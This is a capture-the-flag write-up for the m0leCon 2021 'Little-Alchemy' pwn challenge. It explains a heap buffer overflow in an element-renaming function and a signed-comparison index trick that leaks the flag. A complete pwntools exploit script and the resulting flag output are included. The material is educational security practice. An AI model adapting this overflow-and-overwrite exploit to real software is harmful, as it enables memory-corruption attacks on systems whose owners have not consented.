# m0leCon 2021 CTF Teaser - Little-Alchemy

## Challenge

Alchemy is a wonderful world to explore. Are you able to become a skilled scientist? We need your help to discover many mysterious elements!

`nc challs.m0lecon.it 2123`

Note: the flag is inside the binary, and clearly it is different on the remote server.

[littleAlchemy](littleAlchemy)

### Metadata

- Tags: `pwn`, `warmup`
- Author: *FraLasa*
- Points: 184
- Solves: 24

## Solution

### About the challenge

The program will create four base elements for you (water, fire, air, earth), and lets you combine them. At the beginning, the water element's name is replaced with the flag. We did not use this, which suggests that we may have found an unintended solution.

Combining the elements works via xor. Each base element has an associated value:

- 1: water
- 2: fire
- 4: air
- 8: earth

If you combine two elements, the resulting element's type will be the xor of the sources' types, e.g. if you combine water with earth, you will get `1^8=9`.

The new element's name will be fetched from the `elementName` array, e.g. for type `9`, the newly created element's name will be `elementName[9] == "River"`. The flag is stored in `elementName[10]`, but the program will not let us create an element with type greater than `9` (see the `isValidElement` function). 

We can also rename the existing elements to arbitrary strings.

### Vulnerability

When we rename an element, there is no bounds check, it just reads text until a whitespace:

```c++
void __thiscall Element::customizeName(Element *this)

{
  std::operator>>((basic_istream *)std::cin,this->name);
  return;
}
```

The name of the element is stored inline in the Element structure, in a fixed-size array:

```
struct Element { /* PlaceHolder Class Structure */
    ulong (** vtable)(void);
    byte is_simple_element;
    undefined field_0x9;
    undefined field_0xa;
    undefined field_0xb;
    undefined field_0xc;
    undefined field_0xd;
    undefined field_0xe;
    undefined field_0xf;
    ElementType type;
    undefined field_0x14;
    undefined field_0x15;
    undefined field_0x16;
    undefined field_0x17;
    char name[16];
};
```

This means that we have a buffer overflow on the heap.

### Exploitation

If we create multiple elements, we can overwrite them via the buffer overflow. The idea is to create a new element with type 10, because when the new element is created, the program fetches the name of the element from the `elementName` array. A new element is created in the `combineElements` function:

```c++
ComposedElement * __thiscall
ElementHandler::combineElements(ElementHandler *this,Element *source1,Element *source2)

{
  bool is_valid_element;
  ComposedElement *new_element;
  ulong combined_type;
  basic_ostream *pbVar1;
  
  if ((source1 == (Element *)0x0) || (source2 == (Element *)0x0)) {
    new_element = (ComposedElement *)0x0;
  }
  else {
    combined_type = *(ulong *)&source2->type ^ *(ulong *)&source1->type;
    is_valid_element = (bool)isValidElement(this,combined_type);
    if (is_valid_element == true) {
      if ((combined_type == 0) && (source1->is_simple_element != 0)) {
        new_element = (ComposedElement *)operator.new(0x28);
        Element::Element((Element *)new_element,(ElementType)*(undefined8 *)&source1->type);
        pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*] created ");
        pbVar1 = std::operator<<(pbVar1,(new_element->element).name);
        pbVar1 = std::operator<<(pbVar1,"!");
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
                   std::endl<char,std::char_traits<char>>);
      }
      else {
        new_element = (ComposedElement *)operator.new(0x48);
        ComposedElement::ComposedElement(new_element,(ElementType)combined_type);
        ComposedElement::setSources(new_element,source1,source2);
        pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*] created ");
        pbVar1 = std::operator<<(pbVar1,(new_element->element).name);
        pbVar1 = std::operator<<(pbVar1,"!");
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
                   std::endl<char,std::char_traits<char>>);
      }
    }
    else {
      pbVar1 = std::operator<<((basic_ostream *)std::cout,
                               "[-] not possible to combine this two elements!");
      std::basic_ostream<char,std::char_traits<char>>::operator<<
                ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
                 std::endl<char,std::char_traits<char>>);
      new_element = (ComposedElement *)0x0;
    }
  }
  return new_element;
}
```

From here, we have two plans.

#### Plan A

We noticed that if the xor of the two type (the `combined_type` variable) is zero (i.e. the sources are of the same type), and the first source's `is_simple_element` bit is set, then the resulting element's type will be simply `source1->type`, and not `combined_type`. So the plan was the following:

- Create three elements.
- Edit the name of the first one, overwriting the second and the third; set the type of both of them to 10, and set the `is_simple_element` bit in them.
- Combine the second and third element, which would result in a new element of type `10`.

This seemed like a good plan, but it didn't work, because we had to put `10` as the type, which is the ascii code of the newline character. The new name is read with `cin << this.name`, which stops at a newline character, preventing us from sending our full payload.

#### Plan B

The `isValidElement` function uses signed comparison. This means that besides numbers from `0` to `9`, it also accepts all negative numbers. To see how to exploit this, first take a look at how the offset of the new element's name is calculated.

We have a type `t`, which is an index into an array of pointers (`elementName`). The program calculates the address of the `t`-th element of the array like this:

```
&elementName[t] = &elementName[0] + 8*t
```
If `t == 10`, then the offset will be `8*t = 80`. But what if `t == 2**61 + 10`? The offset will be `(2**61 + 10)*8 = 2**64 + 80`. But `2**64` is the size of the whole address space, so effectively the offset will be `80`. `2**61+10` is still a positive number, but nothing prevents us from using a negative number, like `-2**61+10`. Note that in the exploit script I used `2**64-2**61+10` because I worked with unsigned integers, but when the CPU interprets it as a signed integer, it will just become `-2**61+10`.

`-2**61+10 == 0xe00000000000000a`, which still has a newline character in it (the `0a` in the end). However, since the result will be negative, we will be able to pass the `isValidElement` check, which means that we can build this value by xor-ing two different elements. So here is the plan:

- Create three elements.
- Edit the name of the first one, overwriting the second and the third; set the type of them to two different numbers that, when xored, will give `-2**61+10`.
- Combine the second and third element, which would result in a new element of type `10`.

This plan worked, and since the program prints the newly created element's name, we just had to read it.

### Exploit script

```python
#!/usr/bin/env python3

from pwn import *

import hashlib
from itertools import product

exe = ELF("./littleAlchemy")

context.binary = exe

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        p = remote("challs.m0lecon.it", 2123)
        p.recvuntil("Give me a string starting with ")
        start_string = p.recvuntil(" ")[:-1]
        p.recvuntil('such that its sha256sum ends in ')
        hash_end = p.recvuntil('.')[:-1].decode()
        p.sendline(solve_pow(start_string, hash_end))
        return p


def main():
    r = conn()

    def create_element(pos, source_1, source_2):
        r.sendlineafter(">", "1")
        r.sendlineafter(": ", str(pos))
        r.sendlineafter("]:", str(source_1))
        r.sendlineafter("]:", str(source_2))

    def edit_element(pos, new_name):
        r.sendlineafter(">", "4")
        r.sendlineafter(": ", str(pos))
        r.sendlineafter(": ", new_name)

    # good luck pwning :)

    type1 = (2**64-2**61+10) ^ 0x4242424242424242
    type2 = 0x4242424242424242

    create_element(0, -1, -1)
    create_element(1, -1, -1)
    create_element(2, -1, -1)
    
    payload = b'X'*0x10  # name

    payload += b'Y'*0x8  # chunk size
    payload += b'V'*0x8  # vtable
    payload += p64(0x1)  # is_simple_element
    payload += p64(type1)  # type
    payload += b'X'*0x10 # name

    payload += b'Y'*0x8  # chunk size
    payload += b'V'*0x8  # vtable
    payload += p64(0x1)  # is_simple_element
    payload += p64(type2)  # type

    
    edit_element(0, payload)

    create_element(3, 1, 2)

    r.interactive()


if __name__ == "__main__":
    main()
```

If we run it, we get the flag:

```bash
> python solve.py 
[*] '.../littleAlchemy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.m0lecon.it on port 2123: Done
POW solved: b'vACLppdvGUaYeY'
[*] Switching to interactive mode
 [*] created ptm{vT4bl3s_4r3_d4ng3r0us_019}!
Operations: [1]->Create_element [2]->Print_element [3]->Print_all [4]->Edit_element [5]->Delete_element [6]->Copy_name [7]->Exit
>$
```

The flag is `ptm{vT4bl3s_4r3_d4ng3r0us_019}`.

### Files

- [solve.py](solve.py)